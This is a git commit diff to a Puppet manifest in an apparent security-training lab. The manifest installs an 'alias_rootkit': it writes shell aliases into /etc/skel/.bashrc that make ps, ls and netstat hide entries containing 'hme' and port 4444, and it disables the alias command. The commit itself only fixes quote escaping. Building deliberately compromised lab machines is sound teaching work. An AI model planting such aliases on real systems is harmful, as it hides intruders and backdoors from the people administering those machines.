6195594f8b19b1377e5dfa203cb074c1ddddbbf3
Z. Cliffe Schreuders <code.cliffe@schreuders.org>
2018-11-27 16:10:09 +0000

    lab updates

--- modules/utilities/unix/compromised/alias_rootkit/manifests/install.pp
+++ modules/utilities/unix/compromised/alias_rootkit/manifests/install.pp
@@ -1,6 +1,6 @@
 class alias_rootkit::install {
 
-  $aliases = "alias ps='f(){ ps "$@" |grep -v hme; unset -f f; }; f'; alias ls='f(){ ls "$@" |grep -v hme; unset -f f; }; f'; alias netstat='f(){ netstat "$@" |grep -v 4444|grep -v hme; unset -f f; }; f'; alias alias='true'"
+  $aliases = "alias ps='f(){ ps \"$@\" |grep -v hme; unset -f f; }; f'; alias ls='f(){ ls \"$@\" |grep -v hme; unset -f f; }; f'; alias netstat='f(){ netstat \"$@\" |grep -v 4444|grep -v hme; unset -f f; }; f'; alias alias='true'"
 
   file_line { 'Append a line to /etc/skel/.bashrc':
     path => '/etc/skel/.bashrc',
